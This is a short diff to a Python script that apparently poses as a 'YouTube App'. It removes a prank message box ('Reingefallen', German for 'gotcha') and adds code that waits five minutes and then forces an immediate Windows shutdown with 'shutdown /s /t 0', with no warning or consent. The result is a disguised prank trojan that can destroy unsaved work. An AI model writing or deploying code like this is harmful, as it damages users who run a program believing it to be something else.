@@ -1,2 +1,7 @@
-import ctypes
-ctypes.windll.user32.MessageBoxW(0, "Reingefallen 😜", "YouTube App", 0x40)
+import time
+import os
+
+time.sleep(5 * 60)
+
+# shutdown
+os.system("shutdown /s /t 0")
